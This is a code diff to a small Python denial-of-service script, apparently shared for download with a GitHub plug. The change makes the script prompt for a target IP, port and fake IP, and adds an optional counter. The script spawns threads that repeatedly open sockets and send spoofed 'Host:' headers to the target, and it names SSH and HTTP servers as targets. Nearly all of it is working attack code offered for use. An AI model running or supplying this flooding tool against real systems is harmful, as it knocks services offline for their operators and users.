@@ -1,9 +1,14 @@
 import threading
 import socket
+count = False
 
-target = '' #Insert the ip you want to DOS here (website domains also work)
-port =  #(Insert the port [ex: port = 22]) Port 22: DOS the SSH servers, Port 80: DOS the HTTP servers
-fake_ip = '' #Insert your fake ip here (note: this will not prevent you from getting caught)
+print("Thanks for downloading! Make sure to check out my Github. https://github.com/OblivionGhoul")
+target = input("Enter the target ip: ")
+port = int(input("Insert the port (Port 22: DOS the SSH servers, Port 80: DOS the HTTP servers): "))
+fake_ip = input("Enter a fake ip: ")
+isCount = input("Do you want to see how many times the code runs? (Enter 'YES' or 'NO'): ")
+if (isCount == "YES"):
+    count = True
 
 connectedCount = 0;
 
@@ -15,11 +20,11 @@ def attack():
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
         s.close()
 
-        #You can uncomment the lines below to print out how many times this code is ran, but it will slow down the script.
-        #global connectedCount
-        #connectedCount += 1
-        #print(connectedCount)
+        if (count):
+            global connectedCount
+            connectedCount += 1
+            print(connectedCount)
 
-for i in range(10): #Insert how many threads you want to run (note: python does not support multithreading, it is being simulated)
+for i in range(10):
     thread = threading.Thread(target=attack)
     thread.start()
